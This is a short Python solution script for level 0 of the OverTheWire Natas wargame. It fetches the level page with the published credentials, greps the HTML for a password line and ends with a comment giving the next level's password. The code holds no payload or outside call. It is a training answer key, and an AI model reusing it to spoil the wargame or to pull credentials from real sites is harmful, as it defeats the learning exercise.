# natas0

import requests
from pwn import log
import re

url = 'http://natas0.natas.labs.overthewire.org'
username = "natas0"
password = "natas0"

def exploit():
    res = requests.get(url, auth=(username, password))
    # log.info(res.text)
    flag = re.findall('.*password.*', res.text)
    log.info(flag)

if __name__ == '__main__':
    exploit()

# natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq